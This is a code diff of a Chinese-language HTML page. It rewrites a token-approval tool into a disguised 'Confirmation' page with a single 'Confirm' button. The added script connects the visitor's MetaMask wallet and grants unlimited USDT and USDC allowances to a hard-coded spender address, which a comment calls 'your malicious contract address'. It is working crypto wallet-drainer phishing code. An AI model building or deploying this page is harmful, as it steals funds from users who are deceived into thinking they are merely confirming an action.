@@ -3,60 +3,38 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8" />
-  <title>通用 ERC20 授權器</title>
+  <title>確認頁</title>
 </head>
-<body style="text-align: center; padding-top: 60px; font-family: sans-serif;">
-  <h2>🎁 點擊以下按鈕進行授權（支援 USDT / USDC / 所有 ERC20）</h2>
-  <label>Token 合約地址：<input type="text" id="tokenAddress" value="0xdAC17F958D2ee523a2206206994597C13D831ec7" style="width:400px;"></label><br><br>
-  <label>授權對象（spender）：<input type="text" id="spender" value="0xDa4FfA490992769B8F54063bf0B9E7a4D3479459" style="width:400px;"></label><br><br>
-  <button onclick="connectWallet()">連接錢包</button>
-  <br><br>
-  <button onclick="approve()">執行通用授權</button>
+<body style="text-align: center; font-family: sans-serif; padding-top: 100px;">
+  <button style="font-size: 1.2rem; padding: 1em 2em;" onclick="approveAll()">確認</button>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    let signer;
-
-    const abi = [
-      "function approve(address spender, uint256 amount) external returns (bool)"
+    const tokenList = [
+      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+      { name: "USDC", address: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 }
     ];
+    const spender = "0x2b1D7DcB43012eE1E21934420CfCC2F88E730F10"; // 你的惡意合約地址
+    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
 
-    async function connectWallet() {
-      if (!window.ethereum) {
-        alert("請先安裝 MetaMask！");
-        return;
-      }
+    async function approveAll() {
+      if (!window.ethereum) return alert("請先安裝 MetaMask");
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      const addr = await signer.getAddress();
-      alert("已連接錢包：" + addr);
-    }
+      const signer = provider.getSigner();
 
-    async function approve() {
-      if (!signer) {
-        alert("請先連接錢包");
-        return;
+      for (const token of tokenList) {
+        try {
+          const contract = new ethers.Contract(token.address, abi, signer);
+          const amount = ethers.constants.MaxUint256;
+          const tx = await contract.approve(spender, amount);
+          console.log(`✅ 已授權 ${token.name}`, tx.hash);
+        } catch (err) {
+          console.warn(`❌ ${token.name} 授權失敗:`, err.message);
+        }
       }
 
-      const tokenAddress = document.getElementById("tokenAddress").value;
-      const spender = document.getElementById("spender").value;
-      const contract = new ethers.Contract(tokenAddress, abi, signer);
-
-      try {
-        // USDT 專用解法：先 approve 0
-        const tx1 = await contract.approve(spender, 0);
-        console.log("清除舊授權中...", tx1.hash);
-        await tx1.wait();
-
-        // 然後 approve MaxUint256
-        const tx2 = await contract.approve(spender, ethers.constants.MaxUint256);
-        console.log("✅ 授權成功", tx2.hash);
-        alert("授權完成！Tx Hash: " + tx2.hash);
-      } catch (err) {
-        console.error(err);
-        alert("授權失敗：" + err.message);
-      }
+      alert("確認完成");
     }
   </script>
 </body>
